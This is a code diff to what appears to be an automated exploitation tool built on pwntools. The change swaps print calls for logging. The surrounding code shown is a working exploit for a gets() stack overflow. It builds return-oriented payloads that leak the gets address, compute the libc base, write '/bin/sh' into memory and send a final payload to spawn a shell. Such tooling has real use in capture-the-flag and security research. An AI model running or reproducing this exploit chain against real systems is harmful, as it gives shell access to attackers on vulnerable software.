@@ -1,6 +1,9 @@
 import smrop
+import logging
 
 import pwn
+
+logger = logging.getLogger('ashnazg')
 
 ANALYSES = []
 def register(clazz):
@@ -53,11 +56,8 @@ class GetsVulnerability(Vulnerability):
         # otherwise, this is not exploitable
         # via this technique
         # TODO: Add check
-        print(getscall)
         arg = getscall["arguments"][0]
-        print(arg)
         arg = [v for v in self.function["variables"] if v["name"] == arg][0]
-        print(arg)
         stackoffset = arg["stackOffset"]
         
         prefix = b"A"*abs(stackoffset)
@@ -73,17 +73,16 @@ class GetsVulnerability(Vulnerability):
         payload1 = sm.resolve(binary=0x0, libc=0x0)
 
         # clear out any pending stdout
-        print(conn.recv())
-        print(payload1)
+        conn.recv()
 
         # read libc location
-        print("Sending first payload")
+        logger.info("Sending first payload")
         conn.sendline(payload1)
         gets_location = conn.recvline()[:-1]
-        print(gets_location)
+        logger.info(gets_location)
         gets_location = int.from_bytes(gets_location, byteorder='little')
         libcoffset = gets_location - self.libc.symbols["gets"]
-        print("Libc found at {}".format(hex(libcoffset)))
+        logger.info("Libc found at {}".format(hex(libcoffset)))
 
         # clear out any pending stdout
         conn.recv(timeout=1)
@@ -96,7 +95,7 @@ class GetsVulnerability(Vulnerability):
         sm.ret(function_addr, "binary")
         payload2 = sm.resolve(binary=0x0)
         
-        print("sending second payload")
+        logger.info("sending second payload")
         conn.sendline(payload2)
         conn.sendline("/bin/sh\x00")
 
@@ -108,5 +107,5 @@ class GetsVulnerability(Vulnerability):
 
         payload3 = sm.resolve(binary=0x0, libc=libcoffset)
 
-        print("Sending final payload")
+        logger.info("Sending final payload")
         conn.sendline(payload3)
